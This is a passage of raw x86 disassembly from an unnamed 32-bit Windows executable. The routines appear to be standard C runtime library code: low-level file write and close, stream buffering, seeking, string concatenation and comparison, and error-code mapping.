  432317:	inc    DWORD PTR [ebp-0x7c]
  43231a:	mov    BYTE PTR [eax],0xd
  43231d:	inc    eax
  43231e:	inc    DWORD PTR [ebp-0x70]
  432321:	mov    BYTE PTR [eax],dl
  432323:	inc    eax
  432324:	inc    DWORD PTR [ebp-0x70]
  432327:	cmp    DWORD PTR [ebp-0x70],0x400
  43232e:	jl     0x432301
  432330:	mov    edi,eax
  432332:	lea    eax,[ebp-0x68]
  432335:	sub    edi,eax
  432337:	push   0x0
  432339:	lea    eax,[ebp-0x80]
  43233c:	push   eax
  43233d:	push   edi
  43233e:	lea    eax,[ebp-0x68]
  432341:	push   eax
  432342:	mov    eax,DWORD PTR [ebx]
  432344:	push   DWORD PTR [eax+esi*1]
  432347:	call   DWORD PTR ds:0x4390bc
  43234d:	test   eax,eax
  43234f:	je     0x432370
  432351:	mov    eax,DWORD PTR [ebp-0x80]
  432354:	add    DWORD PTR [ebp-0x78],eax
  432357:	cmp    eax,edi
  432359:	jl     0x432379
  43235b:	mov    eax,DWORD PTR [ebp-0x74]
  43235e:	sub    eax,DWORD PTR [ebp+0x3ac]
  432364:	xor    edi,edi
  432366:	cmp    eax,DWORD PTR [ebp+0x3b0]
  43236c:	jb     0x4322f2
  43236e:	jmp    0x43237b
  432370:	call   DWORD PTR ds:0x4390ac
  432376:	mov    DWORD PTR [ebp-0x6c],eax
  432379:	xor    edi,edi
  43237b:	mov    eax,DWORD PTR [ebp-0x78]
  43237e:	cmp    eax,edi
  432380:	jne    0x432414
  432386:	cmp    DWORD PTR [ebp-0x6c],edi
  432389:	je     0x4323e5
  43238b:	push   0x5
  43238d:	pop    esi
  43238e:	cmp    DWORD PTR [ebp-0x6c],esi
  432391:	jne    0x4323da
  432393:	call   0x432878
  432398:	mov    DWORD PTR [eax],0x9
  43239e:	call   0x432881
  4323a3:	mov    DWORD PTR [eax],esi
  4323a5:	jmp    0x43240f
  4323a7:	push   edi
  4323a8:	lea    ecx,[ebp-0x80]
  4323ab:	push   ecx
  4323ac:	push   DWORD PTR [ebp+0x3b0]
  4323b2:	push   DWORD PTR [ebp+0x3ac]
  4323b8:	push   DWORD PTR [eax]
  4323ba:	call   DWORD PTR ds:0x4390bc
  4323c0:	test   eax,eax
  4323c2:	je     0x4323cf
  4323c4:	mov    eax,DWORD PTR [ebp-0x80]
  4323c7:	mov    DWORD PTR [ebp-0x6c],edi
  4323ca:	mov    DWORD PTR [ebp-0x78],eax
  4323cd:	jmp    0x43237b
  4323cf:	call   DWORD PTR ds:0x4390ac
  4323d5:	mov    DWORD PTR [ebp-0x6c],eax
  4323d8:	jmp    0x43237b
  4323da:	push   DWORD PTR [ebp-0x6c]
  4323dd:	call   0x43288a
  4323e2:	pop    ecx
  4323e3:	jmp    0x43240f
  4323e5:	mov    eax,DWORD PTR [ebx]
  4323e7:	test   BYTE PTR [eax+esi*1+0x4],0x40
  4323ec:	je     0x4323fd
  4323ee:	mov    eax,DWORD PTR [ebp+0x3ac]
  4323f4:	cmp    BYTE PTR [eax],0x1a
  4323f7:	jne    0x4323fd
  4323f9:	xor    eax,eax
  4323fb:	jmp    0x432417
  4323fd:	call   0x432878
  432402:	mov    DWORD PTR [eax],0x1c
  432408:	call   0x432881
  43240d:	mov    DWORD PTR [eax],edi
  43240f:	or     eax,0xffffffff
  432412:	jmp    0x432417
  432414:	sub    eax,DWORD PTR [ebp-0x7c]
  432417:	pop    esi
  432418:	pop    ebx
  432419:	mov    ecx,DWORD PTR [ebp+0x39c]
  43241f:	pop    edi
  432420:	call   0x42f1f2
  432425:	add    ebp,0x3a0
  43242b:	leave  
  43242c:	ret    
  43242d:	push   0xc
  43242f:	push   0x439cc8
  432434:	call   0x431210
  432439:	mov    ebx,DWORD PTR [ebp+0x8]
  43243c:	cmp    ebx,DWORD PTR ds:0x4650ec
  432442:	jae    0x4324bc
  432444:	mov    eax,ebx
  432446:	sar    eax,0x5
  432449:	lea    edi,[eax*4+0x465100]
  432450:	mov    eax,ebx
  432452:	and    eax,0x1f
  432455:	lea    esi,[eax+eax*8]
  432458:	shl    esi,0x2
  43245b:	mov    eax,DWORD PTR [edi]
  43245d:	test   BYTE PTR [eax+esi*1+0x4],0x1
  432462:	je     0x4324bc
  432464:	push   ebx
  432465:	call   0x4367f9
  43246a:	pop    ecx
  43246b:	and    DWORD PTR [ebp-0x4],0x0
  43246f:	mov    eax,DWORD PTR [edi]
  432471:	test   BYTE PTR [eax+esi*1+0x4],0x1
  432476:	je     0x43248c
  432478:	push   DWORD PTR [ebp+0x10]
  43247b:	push   DWORD PTR [ebp+0xc]
  43247e:	push   ebx
  43247f:	call   0x43225f
  432484:	add    esp,0xc
  432487:	mov    DWORD PTR [ebp-0x1c],eax
  43248a:	jmp    0x4324a3
  43248c:	call   0x432878
  432491:	mov    DWORD PTR [eax],0x9
  432497:	call   0x432881
  43249c:	and    DWORD PTR [eax],0x0
  43249f:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4324a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4324a7:	call   0x4324b4
  4324ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4324af:	jmp    0x4324d2
  4324b1:	mov    ebx,DWORD PTR [ebp+0x8]
  4324b4:	push   ebx
  4324b5:	call   0x436899
  4324ba:	pop    ecx
  4324bb:	ret    
  4324bc:	call   0x432878
  4324c1:	mov    DWORD PTR [eax],0x9
  4324c7:	call   0x432881
  4324cc:	and    DWORD PTR [eax],0x0
  4324cf:	or     eax,0xffffffff
  4324d2:	call   0x43124b
  4324d7:	ret    
  4324d8:	push   0xc
  4324da:	push   0x439cd8
  4324df:	call   0x431210
  4324e4:	mov    ebx,DWORD PTR [ebp+0x8]
  4324e7:	cmp    ebx,DWORD PTR ds:0x4650ec
  4324ed:	jae    0x432580
  4324f3:	mov    eax,ebx
  4324f5:	sar    eax,0x5
  4324f8:	lea    edi,[eax*4+0x465100]
  4324ff:	mov    eax,ebx
  432501:	and    eax,0x1f
  432504:	lea    esi,[eax+eax*8]
  432507:	shl    esi,0x2
  43250a:	mov    eax,DWORD PTR [edi]
  43250c:	test   BYTE PTR [eax+esi*1+0x4],0x1
  432511:	je     0x432580
  432513:	push   ebx
  432514:	call   0x4367f9
  432519:	pop    ecx
  43251a:	and    DWORD PTR [ebp-0x4],0x0
  43251e:	mov    eax,DWORD PTR [edi]
  432520:	test   BYTE PTR [eax+esi*1+0x4],0x1
  432525:	je     0x432558
  432527:	push   ebx
  432528:	call   0x4367b8
  43252d:	pop    ecx
  43252e:	push   eax
  43252f:	call   DWORD PTR ds:0x4390c0
  432535:	test   eax,eax
  432537:	jne    0x432544
  432539:	call   DWORD PTR ds:0x4390ac
  43253f:	mov    DWORD PTR [ebp-0x1c],eax
  432542:	jmp    0x432548
  432544:	and    DWORD PTR [ebp-0x1c],0x0
  432548:	cmp    DWORD PTR [ebp-0x1c],0x0
  43254c:	je     0x432567
  43254e:	call   0x432881
  432553:	mov    ecx,DWORD PTR [ebp-0x1c]
  432556:	mov    DWORD PTR [eax],ecx
  432558:	call   0x432878
  43255d:	mov    DWORD PTR [eax],0x9
  432563:	or     DWORD PTR [ebp-0x1c],0xffffffff
  432567:	or     DWORD PTR [ebp-0x4],0xffffffff
  43256b:	call   0x432578
  432570:	mov    eax,DWORD PTR [ebp-0x1c]
  432573:	jmp    0x43258e
  432575:	mov    ebx,DWORD PTR [ebp+0x8]
  432578:	push   ebx
  432579:	call   0x436899
  43257e:	pop    ecx
  43257f:	ret    
  432580:	call   0x432878
  432585:	mov    DWORD PTR [eax],0x9
  43258b:	or     eax,0xffffffff
  43258e:	call   0x43124b
  432593:	ret    
  432594:	push   esi
  432595:	mov    esi,DWORD PTR [esp+0x8]
  432599:	mov    eax,DWORD PTR [esi+0xc]
  43259c:	test   al,0x83
  43259e:	je     0x432670
  4325a4:	test   al,0x40
  4325a6:	jne    0x432670
  4325ac:	test   al,0x2
  4325ae:	je     0x4325bb
  4325b0:	or     eax,0x20
  4325b3:	mov    DWORD PTR [esi+0xc],eax
  4325b6:	jmp    0x432670
  4325bb:	or     eax,0x1
  4325be:	test   ax,0x10c
  4325c2:	mov    DWORD PTR [esi+0xc],eax
  4325c5:	jne    0x4325d0
  4325c7:	push   esi
  4325c8:	call   0x43203f
  4325cd:	pop    ecx
  4325ce:	jmp    0x4325d5
  4325d0:	mov    eax,DWORD PTR [esi+0x8]
  4325d3:	mov    DWORD PTR [esi],eax
  4325d5:	push   DWORD PTR [esi+0x18]
  4325d8:	push   DWORD PTR [esi+0x8]
  4325db:	push   DWORD PTR [esi+0x10]
  4325de:	call   0x436c12
  4325e3:	add    esp,0xc
  4325e6:	test   eax,eax
  4325e8:	mov    DWORD PTR [esi+0x4],eax
  4325eb:	je     0x43265f
  4325ed:	cmp    eax,0xffffffff
  4325f0:	je     0x43265f
  4325f2:	mov    edx,DWORD PTR [esi+0xc]
  4325f5:	test   dl,0x82
  4325f8:	jne    0x432634
  4325fa:	mov    ecx,DWORD PTR [esi+0x10]
  4325fd:	cmp    ecx,0xffffffff
  432600:	push   edi
  432601:	je     0x43261a
  432603:	mov    edi,ecx
  432605:	sar    edi,0x5
  432608:	mov    edi,DWORD PTR [edi*4+0x465100]
  43260f:	and    ecx,0x1f
  432612:	lea    ecx,[ecx+ecx*8]
  432615:	lea    edi,[edi+ecx*4]
  432618:	jmp    0x43261f
  43261a:	mov    edi,0x43dc40
  43261f:	mov    cl,BYTE PTR [edi+0x4]
  432622:	and    cl,0x82
  432625:	cmp    cl,0x82
  432628:	pop    edi
  432629:	jne    0x432634
  43262b:	or     edx,0x2000
  432631:	mov    DWORD PTR [esi+0xc],edx
  432634:	cmp    DWORD PTR [esi+0x18],0x200
  43263b:	jne    0x432651
  43263d:	mov    ecx,DWORD PTR [esi+0xc]
  432640:	test   cl,0x8
  432643:	je     0x432651
  432645:	test   ch,0x4
  432648:	jne    0x432651
  43264a:	mov    DWORD PTR [esi+0x18],0x1000
  432651:	mov    ecx,DWORD PTR [esi]
  432653:	dec    eax
  432654:	mov    DWORD PTR [esi+0x4],eax
  432657:	movzx  eax,BYTE PTR [ecx]
  43265a:	inc    ecx
  43265b:	mov    DWORD PTR [esi],ecx
  43265d:	pop    esi
  43265e:	ret    
  43265f:	neg    eax
  432661:	sbb    eax,eax
  432663:	and    eax,0x10
  432666:	add    eax,0x10
  432669:	or     DWORD PTR [esi+0xc],eax
  43266c:	and    DWORD PTR [esi+0x4],0x0
  432670:	or     eax,0xffffffff
  432673:	pop    esi
  432674:	ret    
  432675:	push   ebp
  432676:	mov    ebp,esp
  432678:	push   esi
  432679:	mov    esi,DWORD PTR [ebp+0x8]
  43267c:	mov    eax,DWORD PTR [esi+0xc]
  43267f:	test   al,0x83
  432681:	push   edi
  432682:	je     0x4326f6
  432684:	mov    edi,DWORD PTR [ebp+0x14]
  432687:	test   edi,edi
  432689:	je     0x432695
  43268b:	cmp    edi,0x1
  43268e:	je     0x432695
  432690:	cmp    edi,0x2
  432693:	jne    0x4326f6
  432695:	and    eax,0xffffffef
  432698:	cmp    edi,0x1
  43269b:	mov    DWORD PTR [esi+0xc],eax
  43269e:	jne    0x4326af
  4326a0:	push   esi
  4326a1:	call   0x432083
  4326a6:	add    DWORD PTR [ebp+0xc],eax
  4326a9:	pop    ecx
  4326aa:	adc    DWORD PTR [ebp+0x10],edx
  4326ad:	xor    edi,edi
  4326af:	push   esi
  4326b0:	call   0x42e2be
  4326b5:	mov    eax,DWORD PTR [esi+0xc]
  4326b8:	test   al,al
  4326ba:	pop    ecx
  4326bb:	jns    0x4326c5
  4326bd:	and    eax,0xfffffffc
  4326c0:	mov    DWORD PTR [esi+0xc],eax
  4326c3:	jmp    0x4326d9
  4326c5:	test   al,0x1
  4326c7:	je     0x4326d9
  4326c9:	test   al,0x8
  4326cb:	je     0x4326d9
  4326cd:	test   ah,0x4
  4326d0:	jne    0x4326d9
  4326d2:	mov    DWORD PTR [esi+0x18],0x200
  4326d9:	push   edi
  4326da:	push   DWORD PTR [ebp+0x10]
  4326dd:	push   DWORD PTR [ebp+0xc]
  4326e0:	push   DWORD PTR [esi+0x10]
  4326e3:	call   0x4365ff
  4326e8:	and    eax,edx
  4326ea:	add    esp,0x10
  4326ed:	cmp    eax,0xffffffff
  4326f0:	je     0x432701
  4326f2:	xor    eax,eax
  4326f4:	jmp    0x432704
  4326f6:	call   0x432878
  4326fb:	mov    DWORD PTR [eax],0x16
  432701:	or     eax,0xffffffff
  432704:	pop    edi
  432705:	pop    esi
  432706:	pop    ebp
  432707:	ret    
  432708:	push   0xc
  43270a:	push   0x439ce8
  43270f:	call   0x431210
  432714:	push   DWORD PTR [ebp+0x8]
  432717:	call   0x42f3b5
  43271c:	pop    ecx
  43271d:	and    DWORD PTR [ebp-0x4],0x0
  432721:	push   DWORD PTR [ebp+0x14]
  432724:	push   DWORD PTR [ebp+0x10]
  432727:	push   DWORD PTR [ebp+0xc]
  43272a:	push   DWORD PTR [ebp+0x8]
  43272d:	call   0x432675
  432732:	add    esp,0x10
  432735:	mov    DWORD PTR [ebp-0x1c],eax
  432738:	or     DWORD PTR [ebp-0x4],0xffffffff
  43273c:	call   0x43274a
  432741:	mov    eax,DWORD PTR [ebp-0x1c]
  432744:	call   0x43124b
  432749:	ret    
  43274a:	push   DWORD PTR [ebp+0x8]
  43274d:	call   0x42f407
  432752:	pop    ecx
  432753:	ret    
  432754:	push   esi
  432755:	mov    esi,DWORD PTR [esp+0x8]
  432759:	mov    eax,DWORD PTR [esi+0xc]
  43275c:	test   al,0x83
  43275e:	je     0x43277d
  432760:	test   al,0x8
  432762:	je     0x43277d
  432764:	push   DWORD PTR [esi+0x8]
  432767:	call   0x42e0ed
  43276c:	and    WORD PTR [esi+0xc],0xfbf7
  432772:	xor    eax,eax
  432774:	pop    ecx
  432775:	mov    DWORD PTR [esi],eax
  432777:	mov    DWORD PTR [esi+0x8],eax
  43277a:	mov    DWORD PTR [esi+0x4],eax
  43277d:	pop    esi
  43277e:	ret    
  43277f:	int3   
  432780:	push   edi
  432781:	mov    edi,DWORD PTR [esp+0x8]
  432785:	jmp    0x4327f5
  432787:	lea    esp,[esp+0x0]
  43278e:	mov    edi,edi
  432790:	mov    ecx,DWORD PTR [esp+0x4]
  432794:	push   edi
  432795:	test   ecx,0x3
  43279b:	je     0x4327b0
  43279d:	mov    al,BYTE PTR [ecx]
  43279f:	add    ecx,0x1
  4327a2:	test   al,al
  4327a4:	je     0x4327e3
  4327a6:	test   ecx,0x3
  4327ac:	jne    0x43279d
  4327ae:	mov    edi,edi
  4327b0:	mov    eax,DWORD PTR [ecx]
  4327b2:	mov    edx,0x7efefeff
  4327b7:	add    edx,eax
  4327b9:	xor    eax,0xffffffff
  4327bc:	xor    eax,edx
  4327be:	add    ecx,0x4
  4327c1:	test   eax,0x81010100
  4327c6:	je     0x4327b0
  4327c8:	mov    eax,DWORD PTR [ecx-0x4]
  4327cb:	test   al,al
  4327cd:	je     0x4327f2
  4327cf:	test   ah,ah
  4327d1:	je     0x4327ed
  4327d3:	test   eax,0xff0000
  4327d8:	je     0x4327e8
  4327da:	test   eax,0xff000000
  4327df:	je     0x4327e3
  4327e1:	jmp    0x4327b0
  4327e3:	lea    edi,[ecx-0x1]
  4327e6:	jmp    0x4327f5
  4327e8:	lea    edi,[ecx-0x2]
  4327eb:	jmp    0x4327f5
  4327ed:	lea    edi,[ecx-0x3]
  4327f0:	jmp    0x4327f5
  4327f2:	lea    edi,[ecx-0x4]
  4327f5:	mov    ecx,DWORD PTR [esp+0xc]
  4327f9:	test   ecx,0x3
  4327ff:	je     0x43281e
  432801:	mov    dl,BYTE PTR [ecx]
  432803:	add    ecx,0x1
  432806:	test   dl,dl
  432808:	je     0x432870
  43280a:	mov    BYTE PTR [edi],dl
  43280c:	add    edi,0x1
  43280f:	test   ecx,0x3
  432815:	jne    0x432801
  432817:	jmp    0x43281e
  432819:	mov    DWORD PTR [edi],edx
  43281b:	add    edi,0x4
  43281e:	mov    edx,0x7efefeff
  432823:	mov    eax,DWORD PTR [ecx]
  432825:	add    edx,eax
  432827:	xor    eax,0xffffffff
  43282a:	xor    eax,edx
  43282c:	mov    edx,DWORD PTR [ecx]
  43282e:	add    ecx,0x4
  432831:	test   eax,0x81010100
  432836:	je     0x432819
  432838:	test   dl,dl
  43283a:	je     0x432870
  43283c:	test   dh,dh
  43283e:	je     0x432867
  432840:	test   edx,0xff0000
  432846:	je     0x43285a
  432848:	test   edx,0xff000000
  43284e:	je     0x432852
  432850:	jmp    0x432819
  432852:	mov    DWORD PTR [edi],edx
  432854:	mov    eax,DWORD PTR [esp+0x8]
  432858:	pop    edi
  432859:	ret    
  43285a:	mov    WORD PTR [edi],dx
  43285d:	mov    eax,DWORD PTR [esp+0x8]
  432861:	mov    BYTE PTR [edi+0x2],0x0
  432865:	pop    edi
  432866:	ret    
  432867:	mov    WORD PTR [edi],dx
  43286a:	mov    eax,DWORD PTR [esp+0x8]
  43286e:	pop    edi
  43286f:	ret    
  432870:	mov    BYTE PTR [edi],dl
  432872:	mov    eax,DWORD PTR [esp+0x8]
  432876:	pop    edi
  432877:	ret    
  432878:	call   0x433901
  43287d:	add    eax,0x8
  432880:	ret    
  432881:	call   0x433901
  432886:	add    eax,0xc
  432889:	ret    
  43288a:	push   esi
  43288b:	call   0x433901
  432890:	mov    ecx,DWORD PTR [esp+0x8]
  432894:	mov    DWORD PTR [eax+0xc],ecx
  432897:	xor    esi,esi
  432899:	cmp    ecx,DWORD PTR [esi*8+0x43d9b0]
  4328a0:	je     0x4328c0
  4328a2:	inc    esi
  4328a3:	cmp    esi,0x2d
  4328a6:	jb     0x432899
  4328a8:	cmp    ecx,0x13
  4328ab:	jb     0x4328d1
  4328ad:	cmp    ecx,0x24
  4328b0:	ja     0x4328d1
  4328b2:	call   0x433901
  4328b7:	mov    DWORD PTR [eax+0x8],0xd
  4328be:	pop    esi
  4328bf:	ret    
  4328c0:	call   0x433901
  4328c5:	mov    ecx,DWORD PTR [esi*8+0x43d9b4]
  4328cc:	mov    DWORD PTR [eax+0x8],ecx
  4328cf:	pop    esi
  4328d0:	ret    
  4328d1:	cmp    ecx,0xbc
  4328d7:	jb     0x4328ef
  4328d9:	cmp    ecx,0xca
  4328df:	ja     0x4328ef
  4328e1:	call   0x433901
  4328e6:	mov    DWORD PTR [eax+0x8],0x8
  4328ed:	pop    esi
  4328ee:	ret    
  4328ef:	call   0x433901
  4328f4:	mov    DWORD PTR [eax+0x8],0x16
  4328fb:	pop    esi
  4328fc:	ret    
  4328fd:	push   esi
  4328fe:	mov    esi,DWORD PTR [esp+0x8]
  432902:	push   esi
  432903:	call   0x4367b8
  432908:	cmp    eax,0xffffffff
  43290b:	pop    ecx
  43290c:	jne    0x43291e
  43290e:	call   0x432878
  432913:	mov    DWORD PTR [eax],0x9
  432919:	or     eax,0xffffffff
  43291c:	pop    esi
  43291d:	ret    
  43291e:	push   edi
  43291f:	push   DWORD PTR [esp+0x14]
  432923:	push   0x0
  432925:	push   DWORD PTR [esp+0x18]
  432929:	push   eax
  43292a:	call   DWORD PTR ds:0x4390c4
  432930:	mov    edi,eax
  432932:	cmp    edi,0xffffffff
  432935:	jne    0x43293f
  432937:	call   DWORD PTR ds:0x4390ac
  43293d:	jmp    0x432941
  43293f:	xor    eax,eax
  432941:	test   eax,eax
  432943:	je     0x432951
  432945:	push   eax
  432946:	call   0x43288a
  43294b:	pop    ecx
  43294c:	or     eax,0xffffffff
  43294f:	jmp    0x43296e
  432951:	mov    ecx,esi
  432953:	and    esi,0x1f
  432956:	sar    ecx,0x5
  432959:	mov    ecx,DWORD PTR [ecx*4+0x465100]
  432960:	mov    eax,esi
  432962:	lea    eax,[eax+eax*8]
  432965:	lea    eax,[ecx+eax*4+0x4]
  432969:	and    BYTE PTR [eax],0xfd
  43296c:	mov    eax,edi
  43296e:	pop    edi
  43296f:	pop    esi
  432970:	ret    
  432971:	push   0xc
  432973:	push   0x439cf8
  432978:	call   0x431210
  43297d:	mov    ebx,DWORD PTR [ebp+0x8]
  432980:	cmp    ebx,DWORD PTR ds:0x4650ec
  432986:	jae    0x432a00
  432988:	mov    eax,ebx
  43298a:	sar    eax,0x5
  43298d:	lea    edi,[eax*4+0x465100]
  432994:	mov    eax,ebx
  432996:	and    eax,0x1f
  432999:	lea    esi,[eax+eax*8]
  43299c:	shl    esi,0x2
  43299f:	mov    eax,DWORD PTR [edi]
  4329a1:	test   BYTE PTR [eax+esi*1+0x4],0x1
  4329a6:	je     0x432a00
  4329a8:	push   ebx
  4329a9:	call   0x4367f9
  4329ae:	pop    ecx
  4329af:	and    DWORD PTR [ebp-0x4],0x0
  4329b3:	mov    eax,DWORD PTR [edi]
  4329b5:	test   BYTE PTR [eax+esi*1+0x4],0x1
  4329ba:	je     0x4329d0
  4329bc:	push   DWORD PTR [ebp+0x10]
  4329bf:	push   DWORD PTR [ebp+0xc]
  4329c2:	push   ebx
  4329c3:	call   0x4328fd
  4329c8:	add    esp,0xc
  4329cb:	mov    DWORD PTR [ebp-0x1c],eax
  4329ce:	jmp    0x4329e7
  4329d0:	call   0x432878
  4329d5:	mov    DWORD PTR [eax],0x9
  4329db:	call   0x432881
  4329e0:	and    DWORD PTR [eax],0x0
  4329e3:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4329e7:	or     DWORD PTR [ebp-0x4],0xffffffff
  4329eb:	call   0x4329f8
  4329f0:	mov    eax,DWORD PTR [ebp-0x1c]
  4329f3:	jmp    0x432a16
  4329f5:	mov    ebx,DWORD PTR [ebp+0x8]
  4329f8:	push   ebx
  4329f9:	call   0x436899
  4329fe:	pop    ecx
  4329ff:	ret    
  432a00:	call   0x432878
  432a05:	mov    DWORD PTR [eax],0x9
  432a0b:	call   0x432881
  432a10:	and    DWORD PTR [eax],0x0
  432a13:	or     eax,0xffffffff
  432a16:	call   0x43124b
  432a1b:	ret    
  432a1c:	push   ebp
  432a1d:	mov    ebp,esp
  432a1f:	sub    esp,0xc
  432a22:	push   ebx
  432a23:	push   esi
  432a24:	push   edi
  432a25:	mov    edi,DWORD PTR [ebp+0x8]
  432a28:	mov    esi,DWORD PTR [edi+0x10]
  432a2b:	xor    ebx,ebx
  432a2d:	cmp    DWORD PTR [edi+0x4],ebx
  432a30:	mov    DWORD PTR [ebp-0xc],esi
  432a33:	jge    0x432a38
  432a35:	mov    DWORD PTR [edi+0x4],ebx
  432a38:	push   0x1
  432a3a:	push   ebx
  432a3b:	push   esi
  432a3c:	call   0x432971
  432a41:	add    esp,0xc
  432a44:	cmp    eax,ebx
  432a46:	mov    DWORD PTR [ebp-0x4],eax
  432a49:	jl     0x432ab9
  432a4b:	mov    ecx,DWORD PTR [edi+0xc]
  432a4e:	test   cx,0x108
  432a53:	jne    0x432a5d
  432a55:	sub    eax,DWORD PTR [edi+0x4]
  432a58:	jmp    0x432b79
  432a5d:	mov    eax,DWORD PTR [edi]
  432a5f:	mov    edx,DWORD PTR [edi+0x8]
  432a62:	mov    ebx,eax
  432a64:	sub    ebx,edx
  432a66:	test   cl,0x3
  432a69:	mov    DWORD PTR [ebp-0x8],ebx
  432a6c:	je     0x432aaa
  432a6e:	mov    ebx,esi
  432a70:	mov    ecx,esi
  432a72:	sar    ebx,0x5
  432a75:	mov    ebx,DWORD PTR [ebx*4+0x465100]
  432a7c:	and    ecx,0x1f
  432a7f:	lea    ecx,[ecx+ecx*8]
  432a82:	test   BYTE PTR [ebx+ecx*4+0x4],0x80
  432a87:	je     0x432a9c
  432a89:	mov    ecx,edx
  432a8b:	cmp    ecx,eax
  432a8d:	jae    0x432a9c
  432a8f:	cmp    BYTE PTR [ecx],0xa
  432a92:	jne    0x432a97
  432a94:	inc    DWORD PTR [ebp-0x8]
  432a97:	inc    ecx
  432a98:	cmp    ecx,DWORD PTR [edi]
  432a9a:	jb     0x432a8f
  432a9c:	cmp    DWORD PTR [ebp-0x4],0x0
  432aa0:	jne    0x432ac1
  432aa2:	mov    eax,DWORD PTR [ebp-0x8]
  432aa5:	jmp    0x432b79
  432aaa:	test   cl,cl
  432aac:	js     0x432a9c
  432aae:	call   0x432878
  432ab3:	mov    DWORD PTR [eax],0x16
  432ab9:	or     eax,0xffffffff
  432abc:	jmp    0x432b79
  432ac1:	test   BYTE PTR [edi+0xc],0x1
  432ac5:	je     0x432b71
  432acb:	mov    ecx,DWORD PTR [edi+0x4]
  432ace:	test   ecx,ecx
  432ad0:	jne    0x432ada
  432ad2:	and    DWORD PTR [ebp-0x8],ecx
  432ad5:	jmp    0x432b71
  432ada:	sub    eax,edx
  432adc:	add    eax,ecx
  432ade:	mov    DWORD PTR [ebp+0x8],eax
  432ae1:	mov    eax,esi
  432ae3:	sar    eax,0x5
  432ae6:	lea    ebx,[eax*4+0x465100]
  432aed:	mov    eax,esi
  432aef:	and    eax,0x1f
  432af2:	lea    esi,[eax+eax*8]
  432af5:	mov    eax,DWORD PTR [ebx]
  432af7:	shl    esi,0x2
  432afa:	test   BYTE PTR [esi+eax*1+0x4],0x80
  432aff:	je     0x432b6b
  432b01:	push   0x2
  432b03:	push   0x0
  432b05:	push   DWORD PTR [ebp-0xc]
  432b08:	call   0x432971
  432b0d:	add    esp,0xc
  432b10:	cmp    eax,DWORD PTR [ebp-0x4]
  432b13:	jne    0x432b32
  432b15:	mov    eax,DWORD PTR [edi+0x8]
  432b18:	mov    ecx,DWORD PTR [ebp+0x8]
  432b1b:	add    ecx,eax
  432b1d:	jmp    0x432b28
  432b1f:	cmp    BYTE PTR [eax],0xa
  432b22:	jne    0x432b27
  432b24:	inc    DWORD PTR [ebp+0x8]
  432b27:	inc    eax
  432b28:	cmp    eax,ecx
  432b2a:	jb     0x432b1f
  432b2c:	test   BYTE PTR [edi+0xd],0x20
  432b30:	jmp    0x432b66
  432b32:	push   0x0
  432b34:	push   DWORD PTR [ebp-0x4]
  432b37:	push   DWORD PTR [ebp-0xc]
  432b3a:	call   0x432971
  432b3f:	mov    eax,0x200
  432b44:	add    esp,0xc
  432b47:	cmp    DWORD PTR [ebp+0x8],eax
  432b4a:	ja     0x432b59
  432b4c:	mov    ecx,DWORD PTR [edi+0xc]
  432b4f:	test   cl,0x8
  432b52:	je     0x432b59
  432b54:	test   ch,0x4
  432b57:	je     0x432b5c
  432b59:	mov    eax,DWORD PTR [edi+0x18]
  432b5c:	mov    DWORD PTR [ebp+0x8],eax
  432b5f:	mov    eax,DWORD PTR [ebx]
  432b61:	test   BYTE PTR [esi+eax*1+0x4],0x4
  432b66:	je     0x432b6b
  432b68:	inc    DWORD PTR [ebp+0x8]
  432b6b:	mov    eax,DWORD PTR [ebp+0x8]
  432b6e:	sub    DWORD PTR [ebp-0x4],eax
  432b71:	mov    eax,DWORD PTR [ebp-0x8]
  432b74:	mov    ecx,DWORD PTR [ebp-0x4]
  432b77:	add    eax,ecx
  432b79:	pop    edi
  432b7a:	pop    esi
  432b7b:	pop    ebx
  432b7c:	leave  
  432b7d:	ret    
  432b7e:	int3   
  432b7f:	int3   
  432b80:	mov    edx,DWORD PTR [esp+0x4]
  432b84:	mov    ecx,DWORD PTR [esp+0x8]
  432b88:	test   edx,0x3
  432b8e:	jne    0x432bcc
  432b90:	mov    eax,DWORD PTR [edx]
  432b92:	cmp    al,BYTE PTR [ecx]
  432b94:	jne    0x432bc4
  432b96:	or     al,al
  432b98:	je     0x432bc0
  432b9a:	cmp    ah,BYTE PTR [ecx+0x1]
  432b9d:	jne    0x432bc4
  432b9f:	or     ah,ah
  432ba1:	je     0x432bc0
  432ba3:	shr    eax,0x10
  432ba6:	cmp    al,BYTE PTR [ecx+0x2]
  432ba9:	jne    0x432bc4
  432bab:	or     al,al
  432bad:	je     0x432bc0
  432baf:	cmp    ah,BYTE PTR [ecx+0x3]
  432bb2:	jne    0x432bc4
  432bb4:	add    ecx,0x4
  432bb7:	add    edx,0x4
  432bba:	or     ah,ah
  432bbc:	jne    0x432b90
  432bbe:	mov    edi,edi
  432bc0:	xor    eax,eax
  432bc2:	ret    
  432bc3:	nop
  432bc4:	sbb    eax,eax
  432bc6:	shl    eax,1
  432bc8:	add    eax,0x1
  432bcb:	ret    
  432bcc:	test   edx,0x1
  432bd2:	je     0x432bec
  432bd4:	mov    al,BYTE PTR [edx]
  432bd6:	add    edx,0x1
  432bd9:	cmp    al,BYTE PTR [ecx]
  432bdb:	jne    0x432bc4
  432bdd:	add    ecx,0x1
  432be0:	or     al,al
  432be2:	je     0x432bc0
  432be4:	test   edx,0x2
  432bea:	je     0x432b90
  432bec:	mov    ax,WORD PTR [edx]
  432bef:	add    edx,0x2
  432bf2:	cmp    al,BYTE PTR [ecx]
  432bf4:	jne    0x432bc4
  432bf6:	or     al,al
  432bf8:	je     0x432bc0
  432bfa:	cmp    ah,BYTE PTR [ecx+0x1]
  432bfd:	jne    0x432bc4
  432bff:	or     ah,ah
  432c01:	je     0x432bc0
  432c03:	add    ecx,0x2
  432c06:	jmp    0x432b90
  432c08:	push   esi
  432c09:	mov    esi,DWORD PTR [esp+0x8]
  432c0d:	push   edi
  432c0e:	push   esi
  432c0f:	call   0x4367b8
  432c14:	cmp    eax,0xffffffff
  432c17:	pop    ecx
  432c18:	je     0x432c56
  432c1a:	cmp    esi,0x1
  432c1d:	je     0x432c24
  432c1f:	cmp    esi,0x2
  432c22:	jne    0x432c3a
  432c24:	push   0x2
  432c26:	call   0x4367b8
  432c2b:	push   0x1
  432c2d:	mov    edi,eax
  432c2f:	call   0x4367b8
  432c34:	cmp    eax,edi
  432c36:	pop    ecx
  432c37:	pop    ecx
  432c38:	je     0x432c56
  432c3a:	push   esi
  432c3b:	call   0x4367b8
  432c40:	pop    ecx
